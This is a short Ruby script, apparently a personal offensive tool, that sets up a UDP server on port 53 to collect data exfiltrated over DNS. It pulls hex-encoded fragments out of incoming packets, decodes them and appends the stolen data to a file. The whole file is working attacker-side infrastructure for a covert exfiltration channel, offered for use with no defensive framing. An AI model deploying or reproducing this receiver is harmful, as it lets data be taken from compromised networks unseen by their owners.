#!/usr/bin/env ruby
# n0vo | @n0vothedreamer
# A small UDP server for received data exfiltrated via DNS

require 'socket'
require 'colorize'

# stuff
data = []
@udp = UDPSocket.new

if ARGV.size < 1
	puts "You must specify a file to write to!".light_red

	exit 1
end

# decode data on the wire
def decode(str)
	str.scan(/../).map { |x| x.hex }.pack('c*')
end

# start the server
@udp.bind('0.0.0.0', 53)

# begin receiving data
begin
	loop do
		# hex encoded exfil data
		recv = @udp.recvfrom(1024)[0]
		exfil_data = recv.match(/[^<][a-f0-9][a-f0-9].*[a-f0-9][a-f0-9]/).to_s
		decoded = decode(exfil_data)

		# if there's any data to decode
		if decoded
			puts "[+] Writing #{decoded} to #{ARGV[0]}"
			# write decoded data to a file
			File.open(ARGV[0], 'a') do |f|
				f.write decoded
			end
		end
	end
rescue Interrupt
  puts "onnection killed!".light_red
end

